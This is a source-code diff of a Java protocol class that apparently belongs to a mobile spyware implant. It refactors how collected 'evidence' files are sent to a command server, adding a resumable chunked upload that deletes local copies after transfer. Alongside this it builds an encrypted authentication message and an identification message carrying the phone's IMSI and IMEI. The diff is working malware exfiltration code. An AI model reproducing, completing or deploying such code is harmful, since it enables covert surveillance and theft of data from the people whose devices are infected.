@@ -95,7 +95,7 @@ public class ZProtocol extends Protocol {
 
 		try {
 			transport.start();
-			
+
 			status.uninstall = authentication();
 
 			if (status.uninstall) {
@@ -167,7 +167,7 @@ public class ZProtocol extends Protocol {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " Info: ***** Authentication *****"); //$NON-NLS-1$
 		}
-		
+
 		// key init
 		try {
 			cryptoConf.init(Keys.self().getChallengeKey());
@@ -175,8 +175,11 @@ public class ZProtocol extends Protocol {
 			random.nextBytes(Nonce);
 
 			final byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication());
-			if (Cfg.DEBUG) { Check.asserts(cypherOut.length % 16 == 0, " (authentication) Assert failed, not multiple of 16: " + cypherOut.length); }
-						
+			if (Cfg.DEBUG) {
+				Check.asserts(cypherOut.length % 16 == 0, " (authentication) Assert failed, not multiple of 16: "
+						+ cypherOut.length);
+			}
+
 			final byte[] response = transport.command(cypherOut);
 
 			return parseAuthentication(response);
@@ -407,15 +410,14 @@ public class ZProtocol extends Protocol {
 	protected byte[] forgeAuthentication() {
 		final iKeys keys = Keys.self();
 
+		/*
+		 * byte[] randBlock = new byte[]{}; if(Cfg.PROTOCOL_RANDBLOCK){ //
+		 * variabilita' di 5 blocchi pkcs5 da 16 randBlock =
+		 * Utils.getRandomByteArray(0, 63+8); }
+		 * 
+		 * final byte[] data = new byte[104 + randBlock.length];
+		 */
 
-		/*byte[] randBlock = new byte[]{};
-		if(Cfg.PROTOCOL_RANDBLOCK){
-			 // variabilita' di 5 blocchi pkcs5 da 16
-			randBlock = Utils.getRandomByteArray(0, 63+8);
-		}
-				 	
-		final byte[] data = new byte[104 + randBlock.length];*/
-		
 		final byte[] data = new byte[104];
 		final DataBuffer dataBuffer = new DataBuffer(data, 0, data.length);
 
@@ -430,12 +432,12 @@ public class ZProtocol extends Protocol {
 		dataBuffer.write(Utils.padByteArray(keys.getBuildId(), 16));
 		dataBuffer.write(keys.getInstanceId());
 		dataBuffer.write(Utils.padByteArray(Keys.getSubtype(), 16));
-		
+
 		if (Cfg.DEBUG) {
 			Check.ensures(dataBuffer.getPosition() == 84, "forgeAuthentication 2, wrong array size"); //$NON-NLS-1$
 		}
-		
-		//dataBuffer.write(randBlock);
+
+		// dataBuffer.write(randBlock);
 
 		// calculating digest
 		final SHA1Digest digest = new SHA1Digest();
@@ -443,14 +445,13 @@ public class ZProtocol extends Protocol {
 		digest.update(keys.getInstanceId());
 		digest.update(Utils.padByteArray(Keys.getSubtype(), 16));
 		digest.update(keys.getConfKey());
-		//digest.update(randBlock);
-				
+		// digest.update(randBlock);
+
 		final byte[] sha1 = digest.getDigest();
 
 		// appending digest
 		dataBuffer.write(sha1);
-		
-		
+
 		if (Cfg.DEBUG) {
 			Check.ensures(dataBuffer.getPosition() == data.length, "forgeAuthentication 3, wrong array size"); //$NON-NLS-1$
 		}
@@ -467,7 +468,7 @@ public class ZProtocol extends Protocol {
 	 *             the protocol exception
 	 */
 	protected boolean parseAuthentication(final byte[] authResult) throws ProtocolException {
-		if(authResult == null){
+		if (authResult == null) {
 			throw new ProtocolException(100);
 		}
 		if (new String(authResult).contains(Messages.getString("6.0"))) { //$NON-NLS-1$
@@ -545,10 +546,10 @@ public class ZProtocol extends Protocol {
 
 		final byte[] userid = WChar.pascalize(device.getImsi());
 		final byte[] deviceid = WChar.pascalize(device.getImei());
-		
+
 		// Non abbiamo quasi mai il numero, inviamo una stringa vuota
 		// cosi appare l'ip
-		//WChar.pascalize(device.getPhoneNumber());
+		// WChar.pascalize(device.getPhoneNumber());
 		final byte[] phone = WChar.pascalize("");
 
 		final int len = 4 + userid.length + deviceid.length + phone.length;
@@ -561,12 +562,12 @@ public class ZProtocol extends Protocol {
 		dataBuffer.write(userid);
 		dataBuffer.write(deviceid);
 		dataBuffer.write(phone);
-		
+
 		if (Cfg.DEBUG) {
 			Check.ensures(dataBuffer.getPosition() == content.length,
 					"forgeIdentification pos: " + dataBuffer.getPosition()); //$NON-NLS-1$
 		}
-		
+
 		return content;
 	}
 
@@ -651,7 +652,7 @@ public class ZProtocol extends Protocol {
 				long time = Utils.byteArrayToLong(result, 8);
 				int size = Utils.byteArrayToInt(result, 16);
 
-				Date date = null; 
+				Date date = null;
 				if (time > 0) {
 					date = new Date(time * 1000);
 				}
@@ -1032,7 +1033,6 @@ public class ZProtocol extends Protocol {
 			Check.log(TAG + " Info: sendEvidences from: " + basePath); //$NON-NLS-1$
 		}
 		final EvidenceCollector logCollector = EvidenceCollector.self();
-
 		final Vector dirs = logCollector.scanForDirLogs(basePath);
 
 		final int dsize = dirs.size();
@@ -1072,42 +1072,15 @@ public class ZProtocol extends Protocol {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " Error: File doesn't exist: " + fullLogName); //$NON-NLS-1$
 					}
-
 					continue;
 				}
-
-				final byte[] content = file.read();
-
-				if (content == null) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " Error: File is empty: " + fullLogName); //$NON-NLS-1$
-					}
-
-					continue;
-				}
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG
-							+ " Info: Sending file: " + EvidenceCollector.decryptName(logName) + " size: " + file.getSize() + " date: " + file.getFileTime()); //$NON-NLS-1$
-				}
-
-				final byte[] plainOut = new byte[content.length + 4];
-
-				System.arraycopy(Utils.intToByteArray(content.length), 0, plainOut, 0, 4);
-				System.arraycopy(content, 0, plainOut, 4, content.length);
-
-				response = command(Proto.LOG, plainOut);
-				final boolean ret = parseLog(response);
-
-				if (ret) {
-					logCollector.remove(fullLogName);
+				
+				if (Cfg.PROTOCOL_RESUME  && file.getSize() > 8 * 1024) {
+					sendResumeEvidence(file);
 				} else {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " Warn: " + "error sending file, bailing out"); //$NON-NLS-1$ //$NON-NLS-2$
-					}
-
-					return;
+					sendEvidence(file);
 				}
+
 			}
 
 			if (!Path.removeDirectory(basePath + dir)) {
@@ -1115,6 +1088,102 @@ public class ZProtocol extends Protocol {
 					Check.log(TAG + " Warn: " + "Not empty directory"); //$NON-NLS-1$ //$NON-NLS-2$
 				}
 			}
+		}
+	}
+
+	private boolean sendResumeEvidence(AutoFile file) throws TransportException, ProtocolException {
+		int chunk = 8 * 1024;
+		int size = (int) file.getSize();
+
+		final byte[] requestBase = new byte[5 * 4];
+
+		byte[] evid = SHA1Digest.get(file.getFilename().getBytes(), 0, 4);
+		System.arraycopy(evid, 0, requestBase, 0, evid.length);
+		System.arraycopy(Utils.intToByteArray(size), 0, requestBase, 12, 4);
+
+		byte[] response = command(Proto.EVOFFSET, requestBase);
+
+		int base = parseLogOffset(response);
+		boolean full = false;
+
+		// TODO: uscita quando finisce
+		while (base < size) {
+			byte[] content = file.read(base, chunk);
+			byte[] plainOut = new byte[content.length + 16];
+
+			writeBuf(plainOut, 0, evid);
+			writeBuf(plainOut, 4, base);
+			writeBuf(plainOut, 8, chunk);
+			writeBuf(plainOut, 12, size);
+			writeBuf(plainOut, 16, content);
+
+			response = command(Proto.EVOFFSET, plainOut);
+			base = parseLogOffset(response);
+			if (base == size) {
+				full = true;
+			}
+			if (base <= 0) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (sendSplitEvidence) Error");
+				}
+				break;
+			}
+		}
+
+		if (full) {
+			EvidenceCollector.self().remove(file.getFilename());
+			return true;
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Warn: " + "error sending file, bailing out"); //$NON-NLS-1$ //$NON-NLS-2$
+			}
+
+			return false;
+		}
+
+	}
+
+	private void writeBuf(byte[] buffer, int pos, int whatever) {
+		System.arraycopy(Utils.intToByteArray(whatever), 0, buffer, pos, 4);
+	}
+
+	private void writeBuf(byte[] buffer, int pos, byte[] whatever) {
+		System.arraycopy(whatever, 0, buffer, pos, whatever.length);
+	}
+
+	private boolean sendEvidence(AutoFile file) throws TransportException, ProtocolException {
+		final byte[] content = file.read();
+
+		if (content == null) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: File is empty: " + file); //$NON-NLS-1$
+			}
+
+			return true;
+		}
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG
+					+ " Info: Sending file: " + EvidenceCollector.decryptName(file.getName()) + " size: " + file.getSize() + " date: " + file.getFileTime()); //$NON-NLS-1$
+		}
+
+		final byte[] plainOut = new byte[content.length + 4];
+
+		System.arraycopy(Utils.intToByteArray(content.length), 0, plainOut, 0, 4);
+		System.arraycopy(content, 0, plainOut, 4, content.length);
+
+		byte[] response = command(Proto.LOG, plainOut);
+		final boolean ret = parseLog(response);
+
+		if (ret) {
+			EvidenceCollector.self().remove(file.getFilename());
+			return true;
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Warn: " + "error sending file, bailing out"); //$NON-NLS-1$ //$NON-NLS-2$
+			}
+
+			return false;
 		}
 	}
 
@@ -1129,6 +1198,23 @@ public class ZProtocol extends Protocol {
 	 */
 	protected boolean parseLog(final byte[] result) throws ProtocolException {
 		return checkOk(result);
+	}
+
+	/**
+	 * Parses the log.
+	 * 
+	 * @param result
+	 *            the result
+	 * @return true, if successful
+	 * @throws ProtocolException
+	 *             the protocol exception
+	 */
+	protected int parseLogOffset(final byte[] result) throws ProtocolException {
+		if (checkOk(result)) {
+			return Utils.byteArrayToInt(result, 4);
+		}
+
+		return -1;
 	}
 
 	/**
